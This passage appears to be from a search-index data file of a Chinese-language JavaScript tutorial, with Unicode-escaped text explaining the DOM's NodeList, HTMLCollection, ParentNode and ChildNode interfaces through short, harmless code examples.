\u662f\u4e00\u4e2a\u8282\u70b9\u5bf9\u8c61\u7684\u96c6\u5408\uff0c\u53ea\u80fd\u5305\u542b\u5143\u7d20\u8282\u70b9\uff08element\uff09\uff0c\u4e0d\u80fd\u5305\u542b\u5176\u4ed6\u7c7b\u578b\u7684\u8282\u70b9\u3002\u5b83\u7684\u8fd4\u56de\u503c\u662f\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff0c\u4f46\u662f\u4e0e NodeList \u63a5\u53e3\u4e0d\u540c\uff0c HTMLCollection \u6ca1\u6709 forEach \u65b9\u6cd5\uff0c\u53ea\u80fd\u4f7f\u7528 for \u5faa\u73af\u904d\u5386\u3002 \u8fd4\u56de HTMLCollection \u5b9e\u4f8b\u7684\uff0c\u4e3b\u8981\u662f\u4e00\u4e9b Document \u5bf9\u8c61\u7684\u96c6\u5408\u5c5e\u6027\uff0c\u6bd4\u5982 document.links \u3001 document.forms \u3001 document.images \u7b49\u3002 1 document . links instanceof HTMLCollection // true HTMLCollection \u5b9e\u4f8b\u90fd\u662f\u52a8\u6001\u96c6\u5408\uff0c\u8282\u70b9\u7684\u53d8\u5316\u4f1a\u5b9e\u65f6\u53cd\u6620\u5728\u96c6\u5408\u4e2d\u3002 \u5982\u679c\u5143\u7d20\u8282\u70b9\u6709 id \u6216 name \u5c5e\u6027\uff0c\u90a3\u4e48 HTMLCollection \u5b9e\u4f8b\u4e0a\u9762\uff0c\u53ef\u4ee5\u4f7f\u7528 id \u5c5e\u6027\u6216 name \u5c5e\u6027\u5f15\u7528\u8be5\u8282\u70b9\u5143\u7d20\u3002\u5982\u679c\u6ca1\u6709\u5bf9\u5e94\u7684\u8282\u70b9\uff0c\u5219\u8fd4\u56de null \u3002 1 2 3 4 5 // HTML \u4ee3\u7801\u5982\u4e0b // <img id=\"pic\" src=\"http://example.com/foo.jpg\"> var pic = document . getElementById ( 'pic' ); document . images . pic === pic // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c document.images \u662f\u4e00\u4e2a HTMLCollection \u5b9e\u4f8b\uff0c\u53ef\u4ee5\u901a\u8fc7 <img> \u5143\u7d20\u7684 id \u5c5e\u6027\u503c\uff0c\u4ece HTMLCollection \u5b9e\u4f8b\u4e0a\u53d6\u5230\u8fd9\u4e2a\u5143\u7d20\u3002 HTMLCollection.prototype.length \u00b6 length \u5c5e\u6027\u8fd4\u56de HTMLCollection \u5b9e\u4f8b\u5305\u542b\u7684\u6210\u5458\u6570\u91cf\u3002 1 document . links . length // 18 HTMLCollection.prototype.item() \u00b6 item \u65b9\u6cd5\u63a5\u53d7\u4e00\u4e2a\u6574\u6570\u503c\u4f5c\u4e3a\u53c2\u6570\uff0c\u8868\u793a\u6210\u5458\u7684\u4f4d\u7f6e\uff0c\u8fd4\u56de\u8be5\u4f4d\u7f6e\u4e0a\u7684\u6210\u5458\u3002 1 2 var c = document . images ; var img0 = c . item ( 0 ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c item(0) \u8868\u793a\u8fd4\u56de0\u53f7\u4f4d\u7f6e\u7684\u6210\u5458\u3002\u7531\u4e8e\u65b9\u62ec\u53f7\u8fd0\u7b97\u7b26\u4e5f\u5177\u6709\u540c\u6837\u4f5c\u7528\uff0c\u800c\u4e14\u4f7f\u7528\u66f4\u65b9\u4fbf\uff0c\u6240\u4ee5\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u603b\u662f\u4f7f\u7528\u65b9\u62ec\u53f7\u8fd0\u7b97\u7b26\u3002 \u5982\u679c\u53c2\u6570\u503c\u8d85\u51fa\u6210\u5458\u6570\u91cf\u6216\u8005\u4e0d\u5408\u6cd5\uff08\u6bd4\u5982\u5c0f\u4e8e0\uff09\uff0c\u90a3\u4e48 item \u65b9\u6cd5\u8fd4\u56de null \u3002 HTMLCollection.prototype.namedItem() \u00b6 namedItem \u65b9\u6cd5\u7684\u53c2\u6570\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a id \u5c5e\u6027\u6216 name \u5c5e\u6027\u7684\u503c\uff0c\u8fd4\u56de\u5f53\u524d\u96c6\u5408\u4e2d\u5bf9\u5e94\u7684\u5143\u7d20\u8282\u70b9\u3002\u5982\u679c\u6ca1\u6709\u5bf9\u5e94\u7684\u8282\u70b9\uff0c\u5219\u8fd4\u56de null \u3002 1 2 3 4 5 // HTML \u4ee3\u7801\u5982\u4e0b // <img id=\"pic\" src=\"http://example.com/foo.jpg\"> var pic = document . getElementById ( 'pic' ); document . images . namedItem ( 'pic' ) === pic // true Collection.namedItem('value') \u7b49\u540c\u4e8e Collection['value'] \u3002","title":"NodeList \u63a5\u53e3\uff0cHTMLCollection \u63a5\u53e3"},{"location":"dom/nodelist/#nodelist-htmlcollection","text":"\u8282\u70b9\u90fd\u662f\u5355\u4e2a\u5bf9\u8c61\uff0c\u6709\u65f6\u9700\u8981\u4e00\u79cd\u6570\u636e\u7ed3\u6784\uff0c\u80fd\u591f\u5bb9\u7eb3\u591a\u4e2a\u8282\u70b9\u3002DOM \u63d0\u4f9b\u4e24\u79cd\u8282\u70b9\u96c6\u5408\uff0c\u7528\u4e8e\u5bb9\u7eb3\u591a\u4e2a\u8282\u70b9\uff1a NodeList \u548c HTMLCollection \u3002 \u8fd9\u4e24\u79cd\u96c6\u5408\u90fd\u5c5e\u4e8e\u63a5\u53e3\u89c4\u8303\u3002\u8bb8\u591a DOM \u5c5e\u6027\u548c\u65b9\u6cd5\uff0c\u8fd4\u56de\u7684\u7ed3\u679c\u662f NodeList \u5b9e\u4f8b\u6216 HTMLCollection \u5b9e\u4f8b\u3002\u4e3b\u8981\u533a\u522b\u662f\uff0c NodeList \u53ef\u4ee5\u5305\u542b\u5404\u79cd\u7c7b\u578b\u7684\u8282\u70b9\uff0c HTMLCollection \u53ea\u80fd\u5305\u542b HTML \u5143\u7d20\u8282\u70b9\u3002","title":"NodeList \u63a5\u53e3\uff0cHTMLCollection \u63a5\u53e3"},{"location":"dom/nodelist/#nodelist","text":"","title":"NodeList \u63a5\u53e3"},{"location":"dom/nodelist/#_1","text":"NodeList \u5b9e\u4f8b\u662f\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff0c\u5b83\u7684\u6210\u5458\u662f\u8282\u70b9\u5bf9\u8c61\u3002\u901a\u8fc7\u4ee5\u4e0b\u65b9\u6cd5\u53ef\u4ee5\u5f97\u5230 NodeList \u5b9e\u4f8b\u3002 Node.childNodes document.querySelectorAll() \u7b49\u8282\u70b9\u641c\u7d22\u65b9\u6cd5 1 document . body . childNodes instanceof NodeList // true NodeList \u5b9e\u4f8b\u5f88\u50cf\u6570\u7ec4\uff0c\u53ef\u4ee5\u4f7f\u7528 length \u5c5e\u6027\u548c forEach \u65b9\u6cd5\u3002\u4f46\u662f\uff0c\u5b83\u4e0d\u662f\u6570\u7ec4\uff0c\u4e0d\u80fd\u4f7f\u7528 pop \u6216 push \u4e4b\u7c7b\u6570\u7ec4\u7279\u6709\u7684\u65b9\u6cd5\u3002 1 2 3 4 5 6 var children = document . body . childNodes ; Array . isArray ( children ) // false children . length // 34 children . forEach ( console . log ) \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0cNodeList \u5b9e\u4f8b children \u4e0d\u662f\u6570\u7ec4\uff0c\u4f46\u662f\u5177\u6709 length \u5c5e\u6027\u548c forEach \u65b9\u6cd5\u3002 \u5982\u679c NodeList \u5b9e\u4f8b\u8981\u4f7f\u7528\u6570\u7ec4\u65b9\u6cd5\uff0c\u53ef\u4ee5\u5c06\u5176\u8f6c\u4e3a\u771f\u6b63\u7684\u6570\u7ec4\u3002 1 2 var children = document . body . childNodes ; var nodeArr = Array . prototype . slice . call ( children ); \u9664\u4e86\u4f7f\u7528 forEach \u65b9\u6cd5\u904d\u5386 NodeList \u5b9e\u4f8b\uff0c\u8fd8\u53ef\u4ee5\u4f7f\u7528 for \u5faa\u73af\u3002 1 2 3 4 5 var children = document . body . childNodes ; for ( var i = 0 ; i < children . length ; i ++ ) { var item = children [ i ]; } \u6ce8\u610f\uff0cNodeList \u5b9e\u4f8b\u53ef\u80fd\u662f\u52a8\u6001\u96c6\u5408\uff0c\u4e5f\u53ef\u80fd\u662f\u9759\u6001\u96c6\u5408\u3002\u6240\u8c13\u52a8\u6001\u96c6\u5408\u5c31\u662f\u4e00\u4e2a\u6d3b\u7684\u96c6\u5408\uff0cDOM \u5220\u9664\u6216\u65b0\u589e\u4e00\u4e2a\u76f8\u5173\u8282\u70b9\uff0c\u90fd\u4f1a\u7acb\u523b\u53cd\u6620\u5728 NodeList \u5b9e\u4f8b\u3002\u76ee\u524d\uff0c\u53ea\u6709 Node.childNodes \u8fd4\u56de\u7684\u662f\u4e00\u4e2a\u52a8\u6001\u96c6\u5408\uff0c\u5176\u4ed6\u7684 NodeList \u90fd\u662f\u9759\u6001\u96c6\u5408\u3002 1 2 3 4 var children = document . body . childNodes ; children . length // 18 document . body . appendChild ( document . createElement ( 'p' )); children . length // 19 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6587\u6863\u589e\u52a0\u4e00\u4e2a\u5b50\u8282\u70b9\uff0cNodeList \u5b9e\u4f8b children \u7684 length \u5c5e\u6027\u5c31\u589e\u52a0\u4e861\u3002","title":"\u6982\u8ff0"},{"location":"dom/nodelist/#nodelistprototypelength","text":"length \u5c5e\u6027\u8fd4\u56de NodeList \u5b9e\u4f8b\u5305\u542b\u7684\u8282\u70b9\u6570\u91cf\u3002 1 2 document . querySelectorAll ( 'xxx' ). length // 0 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c document.querySelectorAll \u8fd4\u56de\u4e00\u4e2a NodeList \u96c6\u5408\u3002\u5bf9\u4e8e\u90a3\u4e9b\u4e0d\u5b58\u5728\u7684 HTML \u6807\u7b7e\uff0c length \u5c5e\u6027\u8fd4\u56de 0 \u3002","title":"NodeList.prototype.length"},{"location":"dom/nodelist/#nodelistprototypeforeach","text":"forEach \u65b9\u6cd5\u7528\u4e8e\u904d\u5386 NodeList \u7684\u6240\u6709\u6210\u5458\u3002\u5b83\u63a5\u53d7\u4e00\u4e2a\u56de\u8c03\u51fd\u6570\u4f5c\u4e3a\u53c2\u6570\uff0c\u6bcf\u4e00\u8f6e\u904d\u5386\u5c31\u6267\u884c\u4e00\u6b21\u8fd9\u4e2a\u56de\u8c03\u51fd\u6570\uff0c\u7528\u6cd5\u4e0e\u6570\u7ec4\u5b9e\u4f8b\u7684 forEach \u65b9\u6cd5\u5b8c\u5168\u4e00\u81f4\u3002 1 2 3 4 var children = document . body . childNodes ; children . forEach ( function f ( item , i , list ) { // ... }, this ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u56de\u8c03\u51fd\u6570 f \u7684\u4e09\u4e2a\u53c2\u6570\u4f9d\u6b21\u662f\u5f53\u524d\u6210\u5458\u3001\u4f4d\u7f6e\u548c\u5f53\u524d NodeList \u5b9e\u4f8b\u3002 forEach \u65b9\u6cd5\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u7528\u4e8e\u7ed1\u5b9a\u56de\u8c03\u51fd\u6570\u5185\u90e8\u7684 this \uff0c\u8be5\u53c2\u6570\u53ef\u7701\u7565\u3002","title":"NodeList.prototype.forEach()"},{"location":"dom/nodelist/#nodelistprototypeitem","text":"item \u65b9\u6cd5\u63a5\u53d7\u4e00\u4e2a\u6574\u6570\u503c\u4f5c\u4e3a\u53c2\u6570\uff0c\u8868\u793a\u6210\u5458\u7684\u4f4d\u7f6e\uff0c\u8fd4\u56de\u8be5\u4f4d\u7f6e\u4e0a\u7684\u6210\u5458\u3002 1 document . body . childNodes . item ( 0 ) \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c item(0) \u8fd4\u56de\u7b2c\u4e00\u4e2a\u6210\u5458\u3002 \u5982\u679c\u53c2\u6570\u503c\u5927\u4e8e\u5b9e\u9645\u957f\u5ea6\uff0c\u6216\u8005\u7d22\u5f15\u4e0d\u5408\u6cd5\uff08\u6bd4\u5982\u8d1f\u6570\uff09\uff0c item \u65b9\u6cd5\u8fd4\u56de null \u3002\u5982\u679c\u7701\u7565\u53c2\u6570\uff0c item \u65b9\u6cd5\u4f1a\u62a5\u9519\u3002 \u6240\u6709\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff0c\u90fd\u53ef\u4ee5\u4f7f\u7528\u65b9\u62ec\u53f7\u8fd0\u7b97\u7b26\u53d6\u51fa\u6210\u5458\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u90fd\u662f\u4f7f\u7528\u65b9\u62ec\u53f7\u8fd0\u7b97\u7b26\uff0c\u800c\u4e0d\u4f7f\u7528 item \u65b9\u6cd5\u3002 1 document . body . childNodes [ 0 ]","title":"NodeList.prototype.item()"},{"location":"dom/nodelist/#nodelistprototypekeysnodelistprototypevaluesnodelistprototypeentries","text":"\u8fd9\u4e09\u4e2a\u65b9\u6cd5\u90fd\u8fd4\u56de\u4e00\u4e2a ES6 \u7684\u904d\u5386\u5668\u5bf9\u8c61\uff0c\u53ef\u4ee5\u901a\u8fc7 for...of \u5faa\u73af\u904d\u5386\u83b7\u53d6\u6bcf\u4e00\u4e2a\u6210\u5458\u7684\u4fe1\u606f\u3002\u533a\u522b\u5728\u4e8e\uff0c keys() \u8fd4\u56de\u952e\u540d\u7684\u904d\u5386\u5668\uff0c values() \u8fd4\u56de\u952e\u503c\u7684\u904d\u5386\u5668\uff0c entries() \u8fd4\u56de\u7684\u904d\u5386\u5668\u540c\u65f6\u5305\u542b\u952e\u540d\u548c\u952e\u503c\u7684\u4fe1\u606f\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 var children = document . body . childNodes ; for ( var key of children . keys ()) { console . log ( key ); } // 0 // 1 // 2 // ... for ( var value of children . values ()) { console . log ( value ); } // #text // <script> // ... for ( var entry of children . entries ()) { console . log ( entry ); } // Array [ 0, #text ] // Array [ 1, <script> ] // ...","title":"NodeList.prototype.keys()\uff0cNodeList.prototype.values()\uff0cNodeList.prototype.entries()"},{"location":"dom/nodelist/#htmlcollection","text":"","title":"HTMLCollection \u63a5\u53e3"},{"location":"dom/nodelist/#_2","text":"HTMLCollection \u662f\u4e00\u4e2a\u8282\u70b9\u5bf9\u8c61\u7684\u96c6\u5408\uff0c\u53ea\u80fd\u5305\u542b\u5143\u7d20\u8282\u70b9\uff08element\uff09\uff0c\u4e0d\u80fd\u5305\u542b\u5176\u4ed6\u7c7b\u578b\u7684\u8282\u70b9\u3002\u5b83\u7684\u8fd4\u56de\u503c\u662f\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff0c\u4f46\u662f\u4e0e NodeList \u63a5\u53e3\u4e0d\u540c\uff0c HTMLCollection \u6ca1\u6709 forEach \u65b9\u6cd5\uff0c\u53ea\u80fd\u4f7f\u7528 for \u5faa\u73af\u904d\u5386\u3002 \u8fd4\u56de HTMLCollection \u5b9e\u4f8b\u7684\uff0c\u4e3b\u8981\u662f\u4e00\u4e9b Document \u5bf9\u8c61\u7684\u96c6\u5408\u5c5e\u6027\uff0c\u6bd4\u5982 document.links \u3001 document.forms \u3001 document.images \u7b49\u3002 1 document . links instanceof HTMLCollection // true HTMLCollection \u5b9e\u4f8b\u90fd\u662f\u52a8\u6001\u96c6\u5408\uff0c\u8282\u70b9\u7684\u53d8\u5316\u4f1a\u5b9e\u65f6\u53cd\u6620\u5728\u96c6\u5408\u4e2d\u3002 \u5982\u679c\u5143\u7d20\u8282\u70b9\u6709 id \u6216 name \u5c5e\u6027\uff0c\u90a3\u4e48 HTMLCollection \u5b9e\u4f8b\u4e0a\u9762\uff0c\u53ef\u4ee5\u4f7f\u7528 id \u5c5e\u6027\u6216 name \u5c5e\u6027\u5f15\u7528\u8be5\u8282\u70b9\u5143\u7d20\u3002\u5982\u679c\u6ca1\u6709\u5bf9\u5e94\u7684\u8282\u70b9\uff0c\u5219\u8fd4\u56de null \u3002 1 2 3 4 5 // HTML \u4ee3\u7801\u5982\u4e0b // <img id=\"pic\" src=\"http://example.com/foo.jpg\"> var pic = document . getElementById ( 'pic' ); document . images . pic === pic // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c document.images \u662f\u4e00\u4e2a HTMLCollection \u5b9e\u4f8b\uff0c\u53ef\u4ee5\u901a\u8fc7 <img> \u5143\u7d20\u7684 id \u5c5e\u6027\u503c\uff0c\u4ece HTMLCollection \u5b9e\u4f8b\u4e0a\u53d6\u5230\u8fd9\u4e2a\u5143\u7d20\u3002","title":"\u6982\u8ff0"},{"location":"dom/nodelist/#htmlcollectionprototypelength","text":"length \u5c5e\u6027\u8fd4\u56de HTMLCollection \u5b9e\u4f8b\u5305\u542b\u7684\u6210\u5458\u6570\u91cf\u3002 1 document . links . length // 18","title":"HTMLCollection.prototype.length"},{"location":"dom/nodelist/#htmlcollectionprototypeitem","text":"item \u65b9\u6cd5\u63a5\u53d7\u4e00\u4e2a\u6574\u6570\u503c\u4f5c\u4e3a\u53c2\u6570\uff0c\u8868\u793a\u6210\u5458\u7684\u4f4d\u7f6e\uff0c\u8fd4\u56de\u8be5\u4f4d\u7f6e\u4e0a\u7684\u6210\u5458\u3002 1 2 var c = document . images ; var img0 = c . item ( 0 ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c item(0) \u8868\u793a\u8fd4\u56de0\u53f7\u4f4d\u7f6e\u7684\u6210\u5458\u3002\u7531\u4e8e\u65b9\u62ec\u53f7\u8fd0\u7b97\u7b26\u4e5f\u5177\u6709\u540c\u6837\u4f5c\u7528\uff0c\u800c\u4e14\u4f7f\u7528\u66f4\u65b9\u4fbf\uff0c\u6240\u4ee5\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u603b\u662f\u4f7f\u7528\u65b9\u62ec\u53f7\u8fd0\u7b97\u7b26\u3002 \u5982\u679c\u53c2\u6570\u503c\u8d85\u51fa\u6210\u5458\u6570\u91cf\u6216\u8005\u4e0d\u5408\u6cd5\uff08\u6bd4\u5982\u5c0f\u4e8e0\uff09\uff0c\u90a3\u4e48 item \u65b9\u6cd5\u8fd4\u56de null \u3002","title":"HTMLCollection.prototype.item()"},{"location":"dom/nodelist/#htmlcollectionprototypenameditem","text":"namedItem \u65b9\u6cd5\u7684\u53c2\u6570\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a id \u5c5e\u6027\u6216 name \u5c5e\u6027\u7684\u503c\uff0c\u8fd4\u56de\u5f53\u524d\u96c6\u5408\u4e2d\u5bf9\u5e94\u7684\u5143\u7d20\u8282\u70b9\u3002\u5982\u679c\u6ca1\u6709\u5bf9\u5e94\u7684\u8282\u70b9\uff0c\u5219\u8fd4\u56de null \u3002 1 2 3 4 5 // HTML \u4ee3\u7801\u5982\u4e0b // <img id=\"pic\" src=\"http://example.com/foo.jpg\"> var pic = document . getElementById ( 'pic' ); document . images . namedItem ( 'pic' ) === pic // true Collection.namedItem('value') \u7b49\u540c\u4e8e Collection['value'] \u3002","title":"HTMLCollection.prototype.namedItem()"},{"location":"dom/parentnode/","text":"ParentNode \u63a5\u53e3\uff0cChildNode \u63a5\u53e3 \u00b6 \u8282\u70b9\u5bf9\u8c61\u9664\u4e86\u7ee7\u627f Node \u63a5\u53e3\u4ee5\u5916\uff0c\u8fd8\u62e5\u6709\u5176\u4ed6\u63a5\u53e3\u3002 ParentNode \u63a5\u53e3\u8868\u793a\u5f53\u524d\u8282\u70b9\u662f\u4e00\u4e2a\u7236\u8282\u70b9\uff0c\u63d0\u4f9b\u4e00\u4e9b\u5904\u7406\u5b50\u8282\u70b9\u7684\u65b9\u6cd5\u3002 ChildNode \u63a5\u53e3\u8868\u793a\u5f53\u524d\u8282\u70b9\u662f\u4e00\u4e2a\u5b50\u8282\u70b9\uff0c\u63d0\u4f9b\u4e00\u4e9b\u76f8\u5173\u65b9\u6cd5\u3002 ParentNode \u63a5\u53e3 \u00b6 \u5982\u679c\u5f53\u524d\u8282\u70b9\u662f\u7236\u8282\u70b9\uff0c\u5c31\u4f1a\u6df7\u5165\u4e86\uff08mixin\uff09 ParentNode \u63a5\u53e3\u3002\u7531\u4e8e\u53ea\u6709\u5143\u7d20\u8282\u70b9\uff08element\uff09\u3001\u6587\u6863\u8282\u70b9\uff08document\uff09\u548c\u6587\u6863\u7247\u6bb5\u8282\u70b9\uff08documentFragment\uff09\u62e5\u6709\u5b50\u8282\u70b9\uff0c\u56e0\u6b64\u53ea\u6709\u8fd9\u4e09\u7c7b\u8282\u70b9\u4f1a\u62e5\u6709 ParentNode \u63a5\u53e3\u3002 ParentNode.children \u00b6 children \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a HTMLCollection \u5b9e\u4f8b\uff0c\u6210\u5458\u662f\u5f53\u524d\u8282\u70b9\u7684\u6240\u6709\u5143\u7d20\u5b50\u8282\u70b9\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 \u4e0b\u9762\u662f\u904d\u5386\u67d0\u4e2a\u8282\u70b9\u7684\u6240\u6709\u5143\u7d20\u5b50\u8282\u70b9\u7684\u793a\u4f8b\u3002 1 2 3 for ( var i = 0 ; i < el . children . length ; i ++ ) { // ... } \u6ce8\u610f\uff0c children \u5c5e\u6027\u53ea\u5305\u62ec\u5143\u7d20\u5b50\u8282\u70b9\uff0c\u4e0d\u5305\u62ec\u5176\u4ed6\u7c7b\u578b\u7684\u5b50\u8282\u70b9\uff08\u6bd4\u5982\u6587\u672c\u5b50\u8282\u70b9\uff09\u3002\u5982\u679c\u6ca1\u6709\u5143\u7d20\u7c7b\u578b\u7684\u5b50\u8282\u70b9\uff0c\u8fd4\u56de\u503c HTMLCollection \u5b9e\u4f8b\u7684 length \u5c5e\u6027\u4e3a 0 \u3002 \u53e6\u5916\uff0c HTMLCollection \u662f\u52a8\u6001\u96c6\u5408\uff0c\u4f1a\u5b9e\u65f6\u53cd\u6620 DOM \u7684\u4efb\u4f55\u53d8\u5316\u3002 ParentNode.firstElementChild \u00b6 firstElementChild \u5c5e\u6027\u8fd4\u56de\u5f53\u524d\u8282\u70b9\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20\u5b50\u8282\u70b9\u3002\u5982\u679c\u6ca1\u6709\u4efb\u4f55\u5143\u7d20\u5b50\u8282\u70b9\uff0c\u5219\u8fd4\u56de null \u3002 1 2 document . firstElementChild . nodeName // \"HTML\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c document \u8282\u70b9\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20\u5b50\u8282\u70b9\u662f <HTML> \u3002 ParentNode.lastElementChild \u00b6 lastElementChild \u5c5e\u6027\u8fd4\u56de\u5f53\u524d\u8282\u70b9\u7684\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u5b50\u8282\u70b9\uff0c\u5982\u679c\u4e0d\u5b58\u5728\u4efb\u4f55\u5143\u7d20\u5b50\u8282\u70b9\uff0c\u5219\u8fd4\u56de null \u3002 1 2 document . lastElementChild . nodeName // \"HTML\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c document \u8282\u70b9\u7684\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u5b50\u8282\u70b9\u662f <HTML> \uff08\u56e0\u4e3a document \u53ea\u5305\u542b\u8fd9\u4e00\u4e2a\u5143\u7d20\u5b50\u8282\u70b9\uff09\u3002 ParentNode.childElementCount \u00b6 childElementCount \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u6574\u6570\uff0c\u8868\u793a\u5f53\u524d\u8282\u70b9\u7684\u6240\u6709\u5143\u7d20\u5b50\u8282\u70b9\u7684\u6570\u76ee\u3002\u5982\u679c\u4e0d\u5305\u542b\u4efb\u4f55\u5143\u7d20\u5b50\u8282\u70b9\uff0c\u5219\u8fd4\u56de 0 \u3002 1 document . body . childElementCount // 13 ParentNode.append()\uff0cParentNode.prepend() \u00b6 \uff081\uff09ParentNode.append() append() \u65b9\u6cd5\u4e3a\u5f53\u524d\u8282\u70b9\u8ffd\u52a0\u4e00\u4e2a\u6216\u591a\u4e2a\u5b50\u8282\u70b9\uff0c\u4f4d\u7f6e\u662f\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u5b50\u8282\u70b9\u7684\u540e\u9762\u3002 \u8be5\u65b9\u6cd5\u4e0d\u4ec5\u53ef\u4ee5\u6dfb\u52a0\u5143\u7d20\u5b50\u8282\u70b9\uff08\u53c2\u6570\u4e3a\u5143\u7d20\u8282\u70b9\uff09\uff0c\u8fd8\u53ef\u4ee5\u6dfb\u52a0\u6587\u672c\u5b50\u8282\u70b9\uff08\u53c2\u6570\u4e3a\u5b57\u7b26\u4e32\uff09\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 var parent = document . body ; // \u6dfb\u52a0\u5143\u7d20\u5b50\u8282\u70b9 var p = document . createElement ( 'p' ); parent . append ( p ); // \u6dfb\u52a0\u6587\u672c\u5b50\u8282\u70b9 parent . append ( 'Hello' ); // \u6dfb\u52a0\u591a\u4e2a\u5143\u7d20\u5b50\u8282\u70b9 var p1 = document . createElement ( 'p' ); var p2 = document . createElement ( 'p' ); parent . append ( p1 , p2 ); // \u6dfb\u52a0\u5143\u7d20\u5b50\u8282\u70b9\u548c\u6587\u672c\u5b50\u8282\u70b9 var p = document . createElement ( 'p' ); parent . append ( 'Hello' , p ); \u8be5\u65b9\u6cd5\u6ca1\u6709\u8fd4\u56de\u503c\u3002 \u6ce8\u610f\uff0c\u8be5\u65b9\u6cd5\u4e0e Node.prototype.appendChild() \u65b9\u6cd5\u6709\u4e09\u70b9\u4e0d\u540c\u3002 append() \u5141\u8bb8\u5b57\u7b26\u4e32\u4f5c\u4e3a\u53c2\u6570\uff0c appendChild() \u53ea\u5141\u8bb8\u5b50\u8282\u70b9\u4f5c\u4e3a\u53c2\u6570\u3002 append() \u6ca1\u6709\u8fd4\u56de\u503c\uff0c\u800c appendChild() \u8fd4\u56de\u6dfb\u52a0\u7684\u5b50\u8282\u70b9\u3002 append() \u53ef\u4ee5\u6dfb\u52a0\u591a\u4e2a\u5b50\u8282\u70b9\u548c\u5b57\u7b26\u4e32\uff08\u5373\u5141\u8bb8\u591a\u4e2a\u53c2\u6570\uff09\uff0c appendChild() \u53ea\u80fd\u6dfb\u52a0\u4e00\u4e2a\u8282\u70b9\uff08\u5373\u53ea\u5141\u8bb8\u4e00\u4e2a\u53c2\u6570\uff09\u3002 \uff082\uff09ParentNode.prepend() prepend() \u65b9\u6cd5\u4e3a\u5f53\u524d\u8282\u70b9\u8ffd\u52a0\u4e00\u4e2a\u6216\u591a\u4e2a\u5b50\u8282\u70b9\uff0c\u4f4d\u7f6e\u662f\u7b2c\u4e00\u4e2a\u5143\u7d20\u5b50\u8282\u70b9\u7684\u524d\u9762\u3002\u5b83\u7684\u7528\u6cd5\u4e0e append() \u65b9\u6cd5\u5b8c\u5168\u4e00\u81f4\uff0c\u4e5f\u662f\u6ca1\u6709\u8fd4\u56de\u503c\u3002 ChildNode \u63a5\u53e3 \u00b6 \u5982\u679c\u4e00\u4e2a\u8282\u70b9\u6709\u7236\u8282\u70b9\uff0c\u90a3\u4e48\u8be5\u8282\u70b9\u5c31\u62e5\u6709\u4e86 ChildNode \u63a5\u53e3\u3002 ChildNode.remove() \u00b6 remove() \u65b9\u6cd5\u7528\u4e8e\u4ece\u7236\u8282\u70b9\u79fb\u9664\u5f53\u524d\u8282\u70b9\u3002 1 el . remove () \u4e0a\u9762\u4ee3\u7801\u5728 DOM \u91cc\u9762\u79fb\u9664\u4e86 el \u8282\u70b9\u3002 ChildNode.before()\uff0cChildNode.after() \u00b6 \uff081\uff09ChildNode.before() before() \u65b9\u6cd5\u7528\u4e8e\u5728\u5f53\u524d\u8282\u70b9\u7684\u524d\u9762\uff0c\u63d2\u5165\u4e00\u4e2a\u6216\u591a\u4e2a\u540c\u7ea7\u8282\u70b9\u3002\u4e24\u8005\u62e5\u6709\u76f8\u540c\u7684\u7236\u8282\u70b9\u3002 \u6ce8\u610f\uff0c\u8be5\u65b9\u6cd5\u4e0d\u4ec5\u53ef\u4ee5\u63d2\u5165\u5143\u7d20\u8282\u70b9\uff0c\u8fd8\u53ef\u4ee5\u63d2\u5165\u6587\u672c\u8282\u70b9\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 var p = document . createElement ( 'p' ); var p1 = document . createElement ( 'p' ); // \u63d2\u5165\u5143\u7d20\u8282\u70b9 el . before ( p ); // \u63d2\u5165\u6587\u672c\u8282\u70b9 el . before ( 'Hello' ); // \u63d2\u5165\u591a\u4e2a\u5143\u7d20\u8282\u70b9 el . before ( p , p1 ); // \u63d2\u5165\u5143\u7d20\u8282\u70b9\u548c\u6587\u672c\u8282\u70b9 el . before ( p , 'Hello' ); \uff082\uff09ChildNode.after() after() \u65b9\u6cd5\u7528\u4e8e\u5728\u5f53\u524d\u8282\u70b9\u7684\u540e\u9762\uff0c\u63d2\u5165\u4e00\u4e2a\u6216\u591a\u4e2a\u540c\u7ea7\u8282\u70b9\uff0c\u4e24\u8005\u62e5\u6709\u76f8\u540c\u7684\u7236\u8282\u70b9\u3002\u7528\u6cd5\u4e0e before \u65b9\u6cd5\u5b8c\u5168\u76f8\u540c\u3002 ChildNode.replaceWith() \u00b6 replaceWith() 